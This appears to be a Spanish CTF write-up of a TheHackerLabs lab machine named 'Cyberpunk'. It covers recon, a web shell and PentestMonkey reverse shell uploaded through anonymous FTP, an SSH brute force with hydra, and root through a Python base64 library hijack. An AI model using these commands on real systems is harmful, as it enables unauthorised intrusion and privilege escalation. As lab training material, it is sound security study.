---
tags:  #Cyberpunk #Web 
  - CTF
  - estado/completado
plataforma: "[[Comunidad de Hacking Ético]]"
dificultad: Fácil
autor: TheHackerLabs
---
# Reconocimiento

 Identificación del sistema:
 
```bash
sudo arp-scan -I eth0 --localnet

Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.0.1	02:10:18:37:9b:14	(Unknown: locally administered)
192.168.0.91	a0:88:69:69:7d:2d	(Unknown)
192.168.0.78	00:0c:29:0e:c0:4e	(Unknown)
192.168.0.110	24:2f:d0:54:73:f6	(Unknown)
192.168.0.202	fc:8f:90:a5:1d:14	(Unknown)
```

Localizamos como posible máquina victima: `192.168.0.78`

Identificamos SO:
```bash
whichSystem.py 192.168.0.78

192.168.0.91 (ttl -> 64): Linux

```

Escaneo 1 nmap

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.0.78 -oG allports

Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 00:0C:29:0E:C0:4E (VMware)
```

Escaneo 2 nmap

```bash
sudo nmap -p21,22,80 -sCV 192.168.0.78 -oN targeted

PORT   STATE SERVICE VERSION
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x   2 0        0            4096 May  1  2024 images
| -rw-r--r--   1 0        0             713 May  1  2024 index.html
|_-rw-r--r--   1 0        0             923 May  1  2024 secret.txt
| fingerprint-strings: 
|   GenericLines: 
|     220 Servidor ProFTPD (Cyberpunk) [::ffff:192.168.0.78]
|     Orden incorrecta: Intenta ser m
|     creativo
|     Orden incorrecta: Intenta ser m
|     creativo
|   Help: 
|     220 Servidor ProFTPD (Cyberpunk) [::ffff:192.168.0.78]
|     214-Se reconocen las siguiente 
|     rdenes (* =>'s' no implementadas):
|     XCWD CDUP XCUP SMNT* QUIT PORT PASV 
|     EPRT EPSV ALLO RNFR RNTO DELE MDTM RMD 
|     XRMD MKD XMKD PWD XPWD SIZE SYST HELP 
|     NOOP FEAT OPTS HOST CLNT AUTH* CCC* CONF* 
|     ENC* MIC* PBSZ* PROT* TYPE STRU MODE RETR 
|     STOR STOU APPE REST ABOR RANG USER PASS 
|     ACCT* REIN* LIST NLST STAT SITE MLSD MLST 
|     comentario a root@Cyberpunk
|   NULL, SMBProgNeg, SSLSessionReq: 
|_    220 Servidor ProFTPD (Cyberpunk) [::ffff:192.168.0.78]
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 6d:b5:c8:65:8d:1f:8a:98:76:93:26:27:df:29:72:4a (ECDSA)
|_  256 a5:83:2a:8f:eb:c6:f1:0b:e0:e6:d8:e1:05:3b:4c:a5 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-title: Arasaka
|_http-server-header: Apache/2.4.59 (Debian)




```

Vemos que tiene el FTP abierto 

Probamos a acceder com `anonymous` al FTP

```bash
ftp anonymous@192.168.0.78
ftp> ls
229 Entering Extended Passive Mode (|||17630|)
150 Abriendo conexión de datos en modo ASCII para file list
drwxr-xr-x   2 0        0            4096 May  1  2024 images
-rw-r--r--   1 0        0             713 May  1  2024 index.html
-rw-r--r--   1 0        0             923 May  1  2024 secret.txt

ftp> get secret.txt
local: secret.txt remote: secret.txt
229 Entering Extended Passive Mode (|||1652|)
150 Opening BINARY mode data connection for secret.txt (923 bytes)
100% |*********************************************************************************************************************************************|   923        2.29 MiB/s    00:00 ETA
226 Transferencia completada

```

Descargamos el archivo `secret.txt`

```bash
cat secret.txt
File: secret.txt

   1   │ *********************************************
   2   │ *                                           *
   3   │ *        Hola Netrunner,                   *
   4   │ *                                           *
   5   │ *   Has sido contratado por el mejor fixer  *
   6   │ *   de la ciudad para llevar a cabo una     *
   7   │ *   misión crucial.                         *
   8   │ *                                           *
   9   │ *   Tenemos información de que Arasaka,     *
  10   │ *   la mega-corporación más poderosa de     *
  11   │ *   Night City, está migrando sus sistemas  *
  12   │ *   y actualmente parece ser vulnerable.    *
  13   │ *   Necesitamos que te infiltres en sus    *
  14   │ *   sistemas y desactives el Relic para     *
  15   │ *   salvar la vida de V.                    *
  16   │ *                                           *
  17   │ *   Te espero en Apache.                    *
  18   │ *                                           *
  19   │ *                         - Alt             *
  20   │ *********************************************

```

Seguimos con fuzzing web

```bash
gobuster dir -u http://192.168.0.78 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.txt

Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/images               (Status: 301) [Size: 313] [--> http://192.168.0.78/images/]
/secret.txt           (Status: 200) [Size: 923]
/.php                 (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
Progress: 661677 / 661680 (100.00%)


```

No encontramos nada. Siguiendo la pista que nos tiran, probamos a buscar vulnerabilidades en la versión de Apache 2.4.59


# Análisis de vulnerabilidades

Apache 2.4.59

```bash
searchsploit Apache 2.4.59
Exploit Title                                                                                                                                       
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution                                                                                        | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner                                                                                      | php/remote/29316.py

```

Al ver que no hay nada vamos a probar otro método. 
Ya que haciendo fuzzing hemos visto que se muestra el mismo fichero que había alojado en el FTP, vamos a probar a subir un archivo para comprobar si podemos acceder
```bash
ftp anonymous@192.168.0.78
ftp> put cmd_Search.php 
```

![image.png](<imagenes/Pasted image 20250223165848.png>)

Vemos que accedermos correctamente. 
Accedemos al fichero `/etc/passwd` y enumeramos usuarios:

```bash
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
arasaka:x:1000:1000:arasaka,,,:/home/arasaka:/bin/bash
```

Con hydra probamos a bruteforcear con el usuario `arasaka`, ya que hemos visto que tenia el puerot 22 abierto.

```bash
hydra -l arasaka -P /usr/share/wordlist/rockyou.txt 192.168.0.78 ssh
```


# Explotación de vulnerabilidades

Al parecer, transcurido un tiempo, no encontramos password.
Probamos a entrar subiendo directamente una rever shell (PentestMonkey) con el método anterior, al FTP y accedemos a

`http://192.168.0.78/shell.php`

Ganamos acceso y hacemos tratamiento de la TTY

```bash
nc -nlvp
listening on [any] 4444 ...
connect to [192.168.0.176] from (UNKNOWN) [192.168.0.78] 48614
Linux Cyberpunk 6.1.0-20-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.85-1 (2024-04-11) x86_64 GNU/Linux
 18:16:49 up  1:21,  0 user,  load average: 1.46, 0.97, 0.54
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: cant access tty; job control turned off
$ script -c bash /dev/null
Script started, output log file is '/dev/null'.
www-data@Cyberpunk:/$ ^Z
[1]  + 84352 suspended  nc -lvnp 4444
❯ stty raw -echo; fg
[1]  + 84352 continued  nc -lvnp 4444
                                     resert xterm
bash: resert: command not found
www-data@Cyberpunk:/$ 
www-data@Cyberpunk:/$ stty rows 24 cols 185 


```


# Escalada de privilegios

Probamos varias maeras de escalar privilegos

Sudo 
```bash
www-data@Cyberpunk:/etc$ sudo -l
[sudo] password for www-data: 
```

Buscamos archivos SUID
```bash
find / -perm -u=s -type f 2/dev/null
/usr/bin/umount
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/su
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/chfn
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

No encontramos nada útil
Vamos a enumerar privilegios con linepeas
Subimos el archivo mediante el ftp y accedemos a el por la revershell

En el log , encontramos algo interesante:

```bash
╔══════════╣ Unexpected in /opt (usually empty)
total 12
drwxr-xr-x  2 root root 4096 May  1  2024 .
drwxr-xr-x 18 root root 4096 May  1  2024 ..
-rwxrwxrwx  1 root root  201 May  1  2024 arasaka.txt
```

Accedemos al archivo

```bash
www-data@Cyberpunk:/opt$ cat arasaka.txt 
++++++++++[>++++++++++>++++++++++++>++++++++++>++++++++++>+++++++++++>+++++++++++>++++++++++++>+++++++++++>+++++++++++>+++++>+++++>++++++<<<<<<<<<<<<-]>-.>+.>--.>+.>++++.>++.>---.>.>---.>.>--.>-----..
```

Se trata de un tipo de código llamado BrainFuck. 
Decodificamos el código con la web : 
`https://www.dcode.fr/brainfuck-language`

Nos da como resultado: `c***********7`
Comprobamos si ese es el password del usuario arasaka

```bash
www-data@Cyberpunk:/opt$ su arasaka
Password: 
arasaka@Cyberpunk:/opt$ 
arasaka@Cyberpunk:/opt$ cd /home
arasaka@Cyberpunk:/home$ cd arasaka/
arasaka@Cyberpunk:~$ ls
randombase64.py  user.txt
arasaka@Cyberpunk:~$ cat user.txt 
```

Ahora que somos el usuario arasaka miramos como podemos escalar privilegios a root:

```bash
arasaka@Cyberpunk:~$ sudo -l
Matching Defaults entries for arasaka on Cyberpunk:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User arasaka may run the following commands on Cyberpunk:
    (root) PASSWD: /usr/bin/python3.11 /home/arasaka/randombase64.py
```

Vemos que tenemos permisos para ejecutar como root el script randombase64.py

```bash
arasaka@Cyberpunk:~$ cat randombase64.py 
import base64
message = input("Enter your string")
message_bytes = message.encode("ascii")
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode("ascii")

print(base64_message)
```

Al tener permisos de root sobre el script y ver que importa librerias, vamos a escalar privilegios creando un script con el nombre de la libreria importada, para que se ejecute antes que el resto del script. En este caso `base64.py`

```bash
arasaka@Cyberpunk:~$ vi base64.py
import os


os.setuid(0)
os.system("/bin/bash")

arasaka@Cyberpunk:~$ sudo /usr/bin/python3.11 /home/arasaka/randombase64.py 
root@Cyberpunk:/home/arasaka# ls


```

Método alternativo:

```bash
import os;
os.system("chmod u+s /bin/bash")

sudo -u root /usr/bin/python3.11 /home/arasaka/randombase64.py
ls -la /bin/bash
bash -p
```


